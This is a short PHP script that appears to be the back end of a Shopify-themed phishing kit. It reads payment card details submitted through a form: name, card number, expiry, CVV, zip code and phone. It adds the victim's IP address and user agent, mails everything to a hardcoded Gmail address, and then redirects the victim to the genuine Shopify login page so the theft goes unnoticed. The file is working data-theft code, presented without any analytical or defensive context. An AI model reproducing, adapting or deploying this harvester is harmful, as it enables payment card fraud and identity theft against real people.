<?php
$to = "chizyshopify@gmail.com";

if($_POST["ncard"] != "" and $_POST["ccard"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Shopify CC Info by zazzy-----------------------\n";
$message .= "Name            : ".$_POST['ncard']."\n";
$message .= "Card            : ".$_POST['ccard']."\n";
$message .= "MM           : ".$_POST['mm']."\n";
$message .= "YY           : ".$_POST['yy']."\n";
$message .= "CVV           : ".$_POST['cvv']."\n";
$message .= "Zip           : ".$_POST['zip']."\n";
$message .= "Phone Number           : ".$_POST['tel']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- RAZ --------------|\n";


$subject = "Shopify CC";
$headers = "From: zazzy <zazzy@xdg-oem-001>";
mail($to, $subject, $message, $headers);

$banner=rand();
$banner=md5($praga);
  header ("Location: https://accounts.shopify.com/store-login");
}else{
header ("Location: index.html");
}

?>